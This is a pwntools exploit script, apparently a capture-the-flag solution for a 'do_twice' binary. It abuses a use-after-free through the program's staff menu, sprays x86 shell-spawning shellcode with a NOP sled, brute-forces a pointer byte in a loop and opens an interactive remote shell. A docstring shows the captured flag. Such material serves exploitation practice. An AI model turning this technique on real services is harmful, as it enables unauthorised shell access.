#!/usr/bin/env python

from pwn import *
import sys

'''
bruteforce a whole byte

$ id
uid=1000 gid=1000(do_twice)
$ ls
do_twice
flag.txt
$ cat flag.txt
Wh4t_h4s_been_fre3_let_1t_go_do_n0t_c4ll_b4ck

'''

def exploit():

	while True:

#		r = process(['./do_twice'])
		r = remote(sys.argv[1], int(sys.argv[2]))

		r.sendlineafter('Remove staff', '1')
		r.sendlineafter(': ', asm(shellcraft.i386.linux.sh(), arch='x86'))

		r.sendlineafter('Remove staff', '1')
		r.sendafter(': ', "A" * 0x3b)

		r.sendlineafter('Remove staff', '2')

		r.sendlineafter('Remove staff', '3')
		r.sendafter(': ', asm(shellcraft.i386.linux.sh(), arch='x86').rjust(0x3b, '\x90'))
		r.sendlineafter(': ', '\xc0' + '\xb0' * (0x1b - 0x10-1))

		try:
			r.sendline('echo uafio')
			data = r.recvline()
			if 'uafio' in data:
				r.interactive()
		except:
			r.close()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
#        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit()
    else:
#        r = process(['./do_twice'])
#        print util.proc.pidof(r)
#        pause()
        exploit()